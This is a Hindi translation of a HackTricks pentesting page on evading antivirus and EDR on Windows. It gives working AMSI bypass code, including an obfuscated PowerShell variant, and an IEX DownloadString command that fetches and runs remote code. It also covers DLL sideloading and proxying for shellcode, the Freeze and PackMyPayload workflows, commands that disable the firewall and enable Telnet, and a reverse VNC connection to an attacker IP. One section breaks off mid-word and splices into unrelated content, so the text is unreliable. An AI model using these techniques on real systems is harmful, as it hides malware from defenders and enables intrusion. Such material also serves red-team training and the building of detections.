# Antivirus (AV) बायपास

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबरसिक्योरिटी कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) में PRs सबमिट करके और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**इस पेज को** [**@m2rc\_p**](https://twitter.com/m2rc\_p)** ने लिखा है!**

## **AV Evasion Methodology**

वर्तमान में, AVs फाइल को मैलिशस है या नहीं यह जांचने के लिए विभिन्न तरीके उपयोग करते हैं, स्टैटिक डिटेक्शन, डायनामिक विश्लेषण, और अधिक उन्नत EDRs के लिए, व्यवहारिक विश्लेषण।

### **स्टैटिक डिटेक्शन**

स्टैटिक डिटेक्शन को बाइनरी या स्क्रिप्ट में ज्ञात मैलिशस स्ट्रिंग्स या बाइट्स के अर्रेज को फ्लैगिंग करके, और फाइल से स्वयं की जानकारी निकालकर (जैसे कि फाइल विवरण, कंपनी का नाम, डिजिटल हस्ताक्षर, आइकन, चेकसम, आदि) हासिल किया जाता है। इसका मतलब है कि ज्ञात सार्वजनिक टूल्स का उपयोग करने से आप अधिक आसानी से पकड़े जा सकते हैं, क्योंकि उन्हें संभवतः विश्लेषण किया गया है और मैलिशस के रूप में फ्लैग किया गया है। इस प्रकार के डिटेक्शन से बचने के कुछ तरीके हैं:

* **एन्क्रिप्शन**

यदि आप बाइनरी को एन्क्रिप्ट करते हैं, तो AV के लिए आपके प्रोग्राम का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको मेमोरी में प्रोग्राम को डिक्रिप्ट करने और चलाने के लिए किसी प्रकार के लोडर की आवश्यकता होगी।

* **ऑब्फस्केशन**

कभी-कभी आपको AV को पार करने के लिए अपने बाइनरी या स्क्रिप्ट में कुछ स्ट्रिंग्स को बदलने की जरूरत होती है, लेकिन यह आपके द्वारा ऑब्फस्केट करने की कोशिश कर रहे हैं उसके आधार पर एक समय लेने वाला कार्य हो सकता है।

* **कस्टम टूलिंग**

यदि आप अपने स्वयं के टूल्स विकसित करते हैं, तो कोई ज्ञात बुरे हस्ताक्षर नहीं होंगे, लेकिन इसमें बहुत समय और प्रयास लगता है।

{% hint style="info" %}
Windows Defender स्टैटिक डिटेक्शन के खिलाफ जांच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह मूल रूप से फाइल को कई खंडों में विभाजित करता है और फिर Defender को प्रत्येक एक को व्यक्तिगत रूप से स्कैन करने का कार्य देता है, इस तरह, यह आपको बिल्कुल बता सकता है कि आपके बाइनरी में कौन से स्ट्रिंग्स या बाइट्स फ्लैग किए गए हैं।
{% endhint %}

मैं आपको व्यावहारिक AV Evasion के बारे में इस [YouTube प्लेलिस्ट](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) को देखने की अत्यधिक सिफारिश करता हूँ।

### **डायनामिक विश्लेषण**

डायनामिक विश्लेषण तब होता है जब AV आपके बाइनरी को एक सैंडबॉक्स में चलाता है और मैलिशस गतिविधि के लिए देखता है (जैसे कि आपके ब्राउज़र के पासवर्ड्स को डिक्रिप्ट करने और पढ़ने की कोशिश करना, LSASS पर मिनिडंप करना, आदि)। यह भाग सैंडबॉक्स से बचने के लिए थोड़ा जटिल हो सकता है, लेकिन यहाँ कुछ चीजें हैं जो आप कर सकते हैं।

* **निष्पादन से पहले स्लीप** यह कैसे लागू किया गया है, इसके आधार पर, AV के डायनामिक विश्लेषण को बायपास करने का एक शानदार तरीका हो सकता है। AV के पास उपयोगकर्ता के कार्यप्रवाह को बाधित न करने के लिए फाइलों को स्कैन करने का बहुत कम समय होता है, इसलिए लंबे स्लीप का उपयोग करने से बाइनरीज का विश्लेषण बाधित हो सकता है। समस्या यह है कि कई AV के सैंडबॉक्स स्लीप को कैसे लागू किया गया है, इसके आधार पर स्लीप को बस स्किप कर सकते हैं।
* **मशीन के संसाधनों की जांच** आमतौर पर सैंडबॉक्स के पास काम करने के लिए बहुत कम संसाधन होते हैं (जैसे < 2GB RAM), अन्यथा वे उपयोगकर्ता की मशीन को धीमा कर सकते हैं। आप यहाँ बहुत रचनात्मक हो सकते हैं, उदाहरण के लिए CPU के तापमान की जांच करके या यहाँ तक कि फैन की गति की जांच करके, सब कुछ सैंडबॉक्स में लागू नहीं किया जाएगा।
* **मशीन-विशिष्ट जांच** यदि आप "contoso.local" डोमेन से जुड़े उपयोगकर्ता के कार्यस्थान को लक्षित करना चाहते हैं, तो आप कंप्यूटर के डोमेन की जांच कर सकते हैं कि क्या यह आपके द्वारा निर्दिष्ट वाले से मेल खाता है, यदि नहीं, तो आप अपने प्रोग्राम को बाहर निकाल सकते हैं।

यह पता चला है कि Microsoft Defender के सैंडबॉक्स का कंप्यूटरनाम HAL9TH है, इसलिए, आप अपने मैलवेयर में कंप्यूटर के नाम की जांच कर सकते हैं विस्फोट से पहले, यदि नाम HAL9TH से मेल खाता है, इसका मतलब है कि आप डिफेंडर के सैंडबॉक्स के अंदर हैं, इसलिए आप अपने प्रोग्राम को बाहर निकाल सकते हैं।

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

सैं
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

यह कमांड "C:\Program Files\\" में DLL हाइजैकिंग के लिए संवेदनशील प्रोग्रामों की सूची और उनके द्वारा लोड की जाने वाली DLL फाइलों को आउटपुट करेगा।

मैं आपको **खुद DLL Hijackable/Sideloadable प्रोग्रामों का पता लगाने की दृढ़ता से सिफारिश करता हूँ**, यह तकनीक ठीक से की जाए तो काफी चुपके से हो सकती है, लेकिन अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable प्रोग्रामों का उपयोग करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

केवल एक दुर्भावनापूर्ण DLL को उस नाम से रखने से, जिसे प्रोग्राम लोड करने की उम्मीद करता है, आपका पेलोड लोड नहीं होगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ विशिष्ट फंक्शन्स की उम्मीद करता है, इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नामक एक और तकनीक का उपयोग करेंगे।

**DLL Proxying** प्रोग्राम द्वारा प्रॉक्सी (और दुर्भावनापूर्ण) DLL से मूल DLL तक कॉल्स को फॉरवर्ड करता है, इस प्रकार प्रोग्राम की कार्यक्षमता को बनाए रखता है और आपके पेलोड के निष्पादन को संभालने में सक्षम होता है।

मैं [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) प्रोजेक्ट का उपयोग करूँगा जो [@flangvik](https://twitter.com/Flangvik/) से है।

मैंने जो कदम उठाए वे ये हैं:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

अंतिम कमांड हमें 2 फाइलें देगा: एक DLL सोर्स कोड टेम्पलेट, और मूल पुनः नामित DLL।

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

ये परिणाम हैं:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे शेलकोड (जिसे [SGN](https://github.com/EgeBalci/sgn) के साथ एन्कोड किया गया है) और प्रॉक्सी DLL दोनों का [antiscan.me](https://antiscan.me) में 0/26 डिटेक्शन रेट है! मैं इसे सफलता कहूंगा।

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
मैं **दृढ़ता से सुझाव देता हूँ** कि आप [S3cur3Th1sSh1t के ट्विच VOD](https://www.twitch.tv/videos/1644171543) को देखें जो DLL Sideloading के बारे में है और साथ ही [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG\_WNpE) भी देखें ताकि आप जो हमने चर्चा की है उसके बारे में और गहराई से जान सकें।
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze एक पेलोड टूलकिट है जो सस्पेंडेड प्रोसेसेस, डायरेक्ट सिस्कॉल्स, और वैकल्पिक एक्जीक्यूशन मेथड्स का उपयोग करके EDRs को बायपास करने के लिए है`

आप Freeze का उपयोग करके अपने शेलकोड को एक चुपके तरीके से लोड और निष्पादित कर सकते हैं।
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Evasion एक बिल्ली और चूहे का खेल है, जो आज काम करता है वह कल पकड़ा जा सकता है, इसलिए कभी भी केवल एक उपकरण पर निर्भर न रहें, यदि संभव हो तो, कई Evasion तकनीकों को जोड़ने का प्रयास करें।
{% endhint %}

## AMSI (Anti-Malware Scan Interface)

AMSI का निर्माण "[fileless malware](https://en.wikipedia.org/wiki/Fileless\_malware)" को रोकने के लिए किया गया था। प्रारंभ में, AV केवल **डिस्क पर फाइलों** को स्कैन करने में सक्षम थे, इसलिए यदि आप किसी तरह से payloads को **सीधे in-memory** निष्पादित कर सकते हैं, तो AV इसे रोकने के लिए कुछ भी नहीं कर सकता था, क्योंकि उसके पास पर्याप्त दृश्यता नहीं थी।

AMSI सुविधा Windows के इन घटकों में एकीकृत है।

* User Account Control, या UAC (EXE, COM, MSI, या ActiveX स्थापना का उन्नयन)
* PowerShell (स्क्रिप्ट, इंटरैक्टिव उपयोग, और गतिशील कोड मूल्यांकन)
* Windows Script Host (wscript.exe और cscript.exe)
* JavaScript और VBScript
* Office VBA macros

यह एंटीवायरस समाधानों को स्क्रिप्ट व्यवहार का निरीक्षण करने की अनुमति देता है, स्क्रिप्ट सामग्री को एक ऐसे रूप में प्रकट करके जो दोनों अनएन्क्रिप्टेड और अनऑब्फस्केटेड है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने से Windows Defender पर निम्नलिखित अलर्ट उत्पन्न होगा।

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` को कैसे जोड़ता है और फिर उस एक्जीक्यूटेबल का पथ जिससे स्क्रिप्ट चली, इस मामले में, powershell.exe

हमने डिस्क पर कोई फाइल नहीं डाली, लेकिन फिर भी AMSI के कारण in-memory में पकड़े गए।

AMSI को बायपास करने के कुछ तरीके हैं:

* **Obfuscation**

चूंकि AMSI मुख्य रूप से स्थिर पतासाजी के साथ काम करता है, इसलिए आप जो स्क्रिप्ट लोड करने की कोशिश करते हैं उसे संशोधित करना पतासाजी का पता लगाने से बचने का एक अच्छा तरीका हो सकता है।

हालांकि, AMSI के पास कई परतों के बावजूद स्क्रिप्ट्स को अनऑब्फस्केट करने की क्षमता है, इसलिए obfuscation कैसे किया जाता है इस पर निर्भर करते हुए एक खराब विकल्प हो सकता है। इससे बचना इतना सीधा नहीं है। हालांकि, कभी-कभी, आपको बस कुछ वेरिएबल नामों को बदलने की जरूरत होती है और आप अच्छे होंगे, इसलिए यह निर्भर करता है कि कितना कुछ चिह्नित किया गया है।

* **AMSI Bypass**

चूंकि AMSI को powershell (साथ ही cscript.exe, wscript.exe, आदि) प्रक्रिया में एक DLL लोड करके लागू किया जाता है, इसलिए इसे आसानी से छेड़छाड़ करना संभव है यहां तक कि एक अनाधिकृत उपयोगकर्ता के रूप में चल रहा हो। AMSI के कार्यान्वयन में इस दोष के कारण, शोधकर्ताओं ने AMSI स्कैनिंग को बायपास करने के कई तरीके खोजे हैं।

**एक त्रुटि को मजबूर करना**

AMSI प्रारंभीकरण को विफल करने के लिए मजबूर करना (amsiInitFailed) का परिणाम यह होगा कि वर्तमान प्रक्रिया के लिए कोई स्कैन शुरू नहीं किया जाएगा। मूल रूप से यह [Matt Graeber](https://twitter.com/mattifestation) द्वारा प्रकट किया गया था और Microsoft ने व्यापक उपयोग को रोकने के लिए एक हस्ताक्षर विकसित किया है।

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

केवल एक पंक्ति का powershell कोड था जिसने AMSI को वर्तमान powershell प्रक्रिया के लिए अनुपयोगी बना दिया। यह पंक्ति AMSI द्वारा स्वयं ही चिह्नित की गई है, इसलिए इस तकनीक का उपयोग करने के लिए कुछ संशोधन की आवश्यकता है।

यहाँ एक संशोधित AMSI बायपास है जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
ध्यान रखें, यह संभवतः इस पोस्ट के बाहर आने के बाद चिह्नित हो जाएगा, इसलिए यदि आपकी योजना अप्रकट रहने की है, तो आपको कोई कोड प्रकाशित नहीं करना चाहिए।

**मेमोरी पैचिंग**

इस तकनीक की खोज मूल रूप से [@RastaMouse](https://twitter.com/\_RastaMouse/) ने की थी और इसमें "AmsiScanBuffer" फंक्शन के लिए पता खोजना शामिल है जो amsi.dll में होता है (जो उपयोगकर्ता-प्रदत्त इनपुट को स्कैन करने के लिए जिम्मेदार होता है) और इसे E_INVALIDARG के कोड के लिए निर्देशों के साथ ओवरराइट करना, इस तरह, वास्तविक स्कैन का परिणाम 0 लौटेगा, जिसे साफ परिणाम के रूप में व्याख्या किया जाता है।

{% hint style="info" %}
कृपया अधिक विस्तृत स्पष्टीकरण के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।
{% endhint %}

पावरशेल के साथ AMSI को बायपास करने के लिए कई अन्य तकनीकें भी प्रयोग की जाती हैं, [**इस पृष्ठ**](basic-powershell-for-pentesters/#amsi-bypass) और [इस रेपो](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) को देखें ताकि उनके बारे में और जान सकें।

या यह स्क्रिप्ट जो मेमोरी पैचिंग के माध्यम से हर नए Powersh को पैच करेगी

## ऑब्फस्केशन

कई उपकरण हैं जो **C# स्पष्ट-पाठ कोड को ऑब्फस्केट करने**, **मेटाप्रोग्रामिंग टेम्प्लेट्स उत्पन्न करने** और **संकलित बाइनरीज को ऑब्फस्केट करने** के लिए प्रयोग किए जा सकते हैं जैसे:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# ऑब्फस्केटर**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): इस प्रोजेक्ट का उद्देश्य [LLVM](http://www.llvm.org/) संकलन सूट का एक ओपन-सोर्स फोर्क प्रदान करना है जो [कोड ऑब्फस्केशन](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) और टैम्पर-प्रूफिंग के माध्यम से बढ़ी हुई सॉफ्टवेयर सुरक्षा प्रदान कर सकता है।
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator दिखाता है कि कैसे `C++11/14` भाषा का उपयोग करके, संकलन समय पर, किसी भी बाहरी उपकरण का उपयोग किए बिना और कंपाइलर को संशोधित किए बिना ऑब्फस्केटेड कोड उत्पन्न किया जा सकता है।
* [**obfy**](https://github.com/fritzone/obfy): C++ टेम्प्लेट मेटाप्रोग्रामिंग फ्रेमवर्क द्वारा उत्पन्न ऑब्फस्केटेड ऑपरेशन्स की एक परत जोड़ें जो एप्लिकेशन को क्रैक करने की इच्छा रखने वाले व्यक्ति के जीवन को थोड़ा कठिन बना देगी।
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz एक x64 बाइनरी ऑब्फस्केटर है जो विभिन्न प्रकार के pe फाइलों को ऑब्फस्केट कर सकता है जिसमें: .exe, .dll, .sys शामिल हैं
* [**metame**](https://github.com/a0rtega/metame): Metame एक सरल मेटामोर्फिक कोड इंजन है जो मनमाने एक्जीक्यूटेबल्स के लिए है।
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator एक बारीक-दाने वाला कोड ऑब्फस्केशन फ्रेमवर्क है जो LLVM-समर्थित भाषाओं के लिए ROP (रिटर्न-ओरिएंटेड प्रोग्रामिंग) का उपयोग करता है। ROPfuscator एक प्रोग्राम को असेंबली कोड स्तर पर ऑब्फस्केट करता है, जिससे सामान्य नियंत्रण प्रवाह की हमारी प्राकृतिक धारणा को बाधित करता है।
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt एक .NET PE Crypter है जो Nim में लिखा गया है
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor मौजूदा EXE/DLL को शेलकोड में बदलने और फिर उन्हें लोड करने में सक्षम है

## SmartScreen & MoTW

आपने इंटरनेट से कुछ एक्जीक्यूटेबल्स डाउनलोड करते समय और उन्हें निष्पादित करते समय यह स्क्रीन देखी होगी।

Microsoft Defender SmartScreen एक सुरक्षा तंत्र है जिसका उद्देश्य अंतिम उपयोगकर्ता को संभावित रूप से हानिकारक एप्लिकेशन्स को चलाने से बचाना है।

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreen मुख्य रूप से प्रतिष्ठा-आधारित दृष्टिकोण के साथ काम करता है, अर्थात् असामान्य रूप से डाउनलोड किए गए एप्लिकेशन्स SmartScreen को ट्रिगर करेंगे जिससे अंतिम उपयोगकर्ता को सतर्क किया जाएगा और फाइल को निष्पादित करने से रोका जाएगा (हालांकि फाइल को अभी भी More Info -> Run anyway पर क्लिक करके निष्पादित किया जा सकता है)।

**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) है जिसका नाम Zone.Identifier होता है जो इंटरनेट से फाइल्स डाउनलोड करते समय स्वचालित रूप से बनाया जाता है, साथ ही उस URL के साथ जहां से यह डाउनलोड किया गया था।

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फाइल के लिए Zone.Identifier ADS की जांच करना।</p></figcaption></figure>

{% hint style="info" %}
यह ध्यान देना महत्वपूर्ण है कि **विश्वसनीय** हस्ताक्षर प्रमाणपत्र के साथ हस्ताक्षरित एक्जीक्यूटेबल्स **SmartScreen को ट्रिगर नहीं करेंगे**।
{% endhint %}

आपके पेलोड्स को Mark of The Web से बचाने का एक बहुत प्रभावी तरीका उन्हें किसी प्रकार के कंटेनर जैसे ISO के अंदर पैकेज करना है। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **NTFS वॉल्यूम्स के अलावा** किसी भी अन्य पर **लागू नहीं** हो सकता।

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक उपकरण है जो पेलोड्स को Mark-of-the-Web से बचने के लिए आउटपुट कंटेनर्स में पैकेज करता है।

उदाहरण का उपयोग:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
यहाँ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) का उपयोग करके ISO फाइलों के अंदर पेलोड पैकेजिंग द्वारा SmartScreen को बायपास करने का एक डेमो है।

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# असेंबली रिफ्लेक्शन

C# बाइनरीज को मेमोरी में लोड करना काफी समय से जाना जाता है और यह अभी भी AV को पकड़े बिना आपके पोस्ट-एक्सप्लॉइटेशन टूल्स को चलाने का एक बहुत अच्छा तरीका है।

चूंकि पेलोड सीधे मेमोरी में लोड हो जाएगा बिना डिस्क को छूए, हमें केवल पूरी प्रक्रिया के लिए AMSI को पैच करने की चिंता करनी होगी।

अधिकांश C2 फ्रेमवर्क्स (sliver, Covenant, metasploit, CobaltStrike, Havoc, आदि) पहले से ही मेमोरी में सीधे C# असेंबलीज को निष्पादित करने की क्षमता प्रदान करते हैं, लेकिन ऐसा करने के विभिन्न तरीके हैं:

* **Fork\&Run**

इसमें **एक नया बलिदानी प्रक्रिया उत्पन्न करना**, उस नई प्रक्रिया में आपके पोस्ट-एक्सप्लॉइटेशन मैलिशस कोड को इंजेक्ट करना, आपके मैलिशस कोड को निष्पादित करना और जब समाप्त हो जाए, तो नई प्रक्रिया को मारना शामिल है। इसके लाभ और नुकसान दोनों हैं। Fork और run विधि का लाभ यह है कि निष्पादन हमारे Beacon इम्प्लांट प्रक्रिया के **बाहर** होता है। इसका मतलब है कि अगर हमारे पोस्ट-एक्सप्लॉइटेशन क्रिया में कुछ गलत होता है या पकड़ा जाता है, तो हमारे **इम्प्लांट के बचने की** **बहुत अधिक संभावना** है। नुकसान यह है कि आपके **Behavioural Detections** द्वारा पकड़े जाने की **अधिक संभावना** है।

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

यह अपनी पोस्ट-एक्सप्लॉइटेशन मैलिशस कोड को **अपनी ही प्रक्रिया में इंजेक्ट करने** के बारे में है। इस तरह, आप एक नई प्रक्रिया बनाने और AV द्वारा स्कैन किए जाने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके पेलोड के निष्पादन के साथ कुछ गलत होता है, तो **आपके बीकन को खोने की** **बहुत अधिक संभावना** है क्योंकि यह क्रैश हो सकता है।

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
यदि आप C# असेंबली लोडिंग के बारे में और पढ़ना चाहते हैं, तो कृपया इस लेख को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनके InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

आप C# असेंबलीज को **PowerShell से** भी लोड कर सकते हैं, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t का वीडियो](https://www.youtube.com/watch?v=oe11Q-3Akuk) देखें।

## अन्य प्रोग्रामिंग भाषाओं का उपयोग

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) में प्रस्तावित के अनुसार, आप हमलावर नियंत्रित SMB शेयर पर स्थापित इंटरप्रेटर वातावरण को समझौता किए गए मशीन को एक्सेस देकर अन्य भाषाओं में मैलिशस कोड को निष्पादित कर सकते हैं।

SMB शेयर पर इंटरप्रेटर बाइनरीज और वातावरण को एक्सेस देने से आप समझौता किए गए मशीन की मेमोरी के भीतर इन भाषाओं में **मनमाने कोड को निष्पादित कर सकते हैं**।

रेपो इंगित करता है: Defender अभी भी स्क्रिप्ट्स को स्कैन करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमें स्टेटिक सिग्नेचर्स को बायपास करने के लिए **अधिक लचीलापन** मिलता है। इन भाषाओं में यादृच्छिक अन-ऑब्फस्केटेड रिवर्स शेल स्क्रिप्ट्स के साथ परीक्षण सफल रहा है।

## उन्नत ईवेजन

ईवेजन एक बहुत ही जटिल विषय है, कभी-कभी आपको केवल एक सिस्टम में कई अलग-अलग स्रोतों के टेलीमेट्री को ध्यान में रखना पड़ता है, इसलिए परिपक्व वातावरण में पूरी तरह से अप्रकट रहना लगभग असंभव है।

आप जिस भी वातावरण के खिलाफ जाएंगे, उनकी अपनी ताकत और कमजोरियां होंगी।

मैं आपको अधिक उन्नत ईवेजन तकनीकों में एक पकड़ पाने के लिए [@ATTL4S](https://twitter.com/DaniLJ94) के इस वार्ता को देखने की दृढ़ता से सलाह देता हूँ।

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

यह ईवेजन इन डेप्थ के बारे में [@mariuszbit](https://twitter.com/mariuszbit) से एक और शानदार वार्ता भी है।

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **पुरानी तकनीकें**

### **Telnet सर्वर**

Windows10 तक, सभी Windows में एक **Telnet सर्वर** आता था जिसे आप (प्रशासक के रूप में) इस प्रकार स्थापित कर सकते थे:
```
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम शुरू होने पर इसे **शुरू** करें और अभी इसे **चलाएं**:
```
sc config TlntSVR start= auto obj= localsystem
```
**तेलनेट पोर्ट बदलें** (गुप्त) और फ़ायरवॉल अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे यहाँ से डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको bin डाउनलोड्स चाहिए, सेटअप नहीं)

**होस्ट पर**: _**winvnc.exe**_ निष्पादित करें और सर्वर को कॉन्फ़िगर करें:

* _Disable TrayIcon_ विकल्प को सक्षम करें
* _VNC Password_ में एक पासवर्ड सेट करें
* _View-Only Password_ में एक पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नवनिर्मित** फ़ाइल _**UltraVNC.ini**_ को **शिकार** के अंदर ले जाएँ

#### **रिवर्स कनेक्शन**

**हमलावर** को अपने **होस्ट** के अंदर बाइनरी `vncviewer.exe -listen 5900` को निष्पादित करना चाहिए ताकि वह रिवर्स **VNC कनेक्शन** को पकड़ने के लिए **तैयार** हो। फिर, **शिकार** के अंदर: winvnc डेमॉन `winvnc.exe -run` को शुरू करें और `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` को चलाएँ

**चेतावनी:** गुप्तता बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

